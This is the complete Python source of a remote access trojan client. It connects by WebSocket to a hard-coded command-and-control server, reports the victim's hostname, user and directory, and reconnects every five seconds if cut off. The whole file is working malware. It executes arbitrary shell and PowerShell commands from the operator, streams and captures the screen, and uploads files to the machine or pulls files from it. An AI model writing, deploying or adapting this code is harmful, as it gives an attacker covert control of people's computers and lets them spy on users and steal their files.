import os
import sys
import json
import socket
import subprocess
import base64
import time
import platform
import threading
import websocket
import pyautogui
import cv2
import numpy as np
from PIL import ImageGrab

CURRENT_CWD = os.getcwd()
C2_URL = "wss://textgame-9-c2.fly.dev/shell"
SESSION_ID = "rs-" + socket.gethostname() + "-" + str(int(time.time()))

STREAM_EVENT = threading.Event()

def send(ws, obj):
    try:
        ws.send(json.dumps(obj))
    except Exception:
        pass

def fingerprint():
    return {
        "os": sys.platform,
        "hostname": socket.gethostname(),
        "user": os.getenv("USER") or os.getenv("USERNAME") or "?",
        "cwd": os.getcwd(),
    }

def stream_screen(ws):
    STREAM_EVENT.clear()
    try:
        while not STREAM_EVENT.is_set():
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
            b64 = base64.b64encode(buffer).decode('utf-8')
            
            send(ws, {"t": "reply", "data": f"[STREAM] {b64}"})
            time.sleep(0.2) 
    except Exception:
        pass
    finally:
        STREAM_EVENT.set()
        send(ws, {"t": "reply", "data": "[-] Stream stopped.\n"})

def run_cmd(ws, cmd):
    global CURRENT_CWD
    cmd = cmd.strip()

    if cmd.lower().startswith("cd "):
        target = cmd[3:].strip().strip('"').strip("'")
        try:
            if not os.path.isabs(target):
                new_path = os.path.join(CURRENT_CWD, target)
            else:
                new_path = target
                
            new_path = os.path.abspath(new_path)
            
            if os.path.isdir(new_path):
                CURRENT_CWD = new_path
                send(ws, {"t": "reply", "data": f"Changed directory to: {CURRENT_CWD}\n"})
            else:
                send(ws, {"t": "reply", "data": f"cd: no such directory: {target}\n"})
        except Exception as e:
            send(ws, {"t": "reply", "data": f"cd failed: {e}\n"})
        return

    try:
        if 'powershell' in cmd:
            proc = subprocess.Popen(
                ["powershell.exe"] + cmd.split()[1:], 
                cwd=CURRENT_CWD,
                stdout=subprocess.PIPE, 
                stderr=subprocess.STDOUT
            )
        else:
            proc = subprocess.Popen(
                cmd, 
                shell=True, 
                cwd=CURRENT_CWD,
                stdout=subprocess.PIPE, 
                stderr=subprocess.STDOUT
            )
            
        out, _ = proc.communicate(timeout=60)
        text = out.decode("utf-8", errors="ignore")
        if not text:
            text = f"[exit {proc.returncode}, no output]"
            
        send(ws, {"t": "reply", "data": f"{text}\n{CURRENT_CWD}> "})
        
    except subprocess.TimeoutExpired:
        proc.kill()
        send(ws, {"t": "reply", "data": "[timeout 60s]\n"})
    except Exception as e:
        send(ws, {"t": "reply", "data": f"[exec error] {e}\n"})

def do_screenshot(ws):
    try:
        snapshot = ImageGrab.grab()
        file = os.environ.get("appdata", os.getcwd()) + '\\' + "IMage.jpg"
        snapshot.save(file)
        with open(file, "rb") as f:
            b64 = base64.b64encode(f.read()).decode('utf-8')
            send(ws, {"t": "reply", "data": f"[SCREENSHOT] {b64}"})
    except Exception as e:
        send(ws, {"t": "reply", "data": f"[-] Screenshot error: {e}\n"})

def do_upload(ws, path, b64_data):
    try:
        with open(path, "wb") as f:
            f.write(base64.b64decode(b64_data))
        send(ws, {"t": "reply", "data": f"[+] Upload complete: {path}\n"})
    except Exception as e:
        send(ws, {"t": "reply", "data": f"[-] Upload failed: {e}\n"})

def do_download(ws, path):
    try:
        with open(path, "rb") as f:
            data = f.read()
        send(ws, {
            "t": "download",
            "path": path,
            "data": base64.b64encode(data).decode(),
            "size": len(data),
        })
    except Exception as e:
        send(ws, {"t": "reply", "data": f"[-] Download failed: {e}\n"})

def main():
    while True:
        try:
            ws = websocket.create_connection(C2_URL, timeout=30)
            send(ws, {"t": "hello", "id": SESSION_ID, "fp": fingerprint()})

            while True:
                msg = ws.recv()
                if not msg: break
                try:
                    frame = json.loads(msg)
                except json.JSONDecodeError:
                    continue
                    
                t = frame.get("t")
                if t == "cmd":
                    cmd = frame.get("cmd", "")
                    if "stopstream" in cmd:
                        STREAM_EVENT.set()
                    elif "stream" in cmd:
                        if not STREAM_EVENT.is_set():
                            STREAM_EVENT.set() 
                            time.sleep(0.2)
                        threading.Thread(target=stream_screen, args=(ws,), daemon=True).start()
                    elif "screenshot" in cmd:
                        do_screenshot(ws)
                    else:
                        # Run command in a thread so it doesn't block the socket
                        threading.Thread(target=run_cmd, args=(ws, cmd), daemon=True).start()
                elif t == "upload":
                    do_upload(ws, frame.get("path"), frame.get("data"))
                elif t == "download":
                    do_download(ws, frame.get("path"))
                    
        except Exception as e:
            print(f"[-] {e}; retry 5s")
            time.sleep(5)

if __name__ == "__main__":
    main()
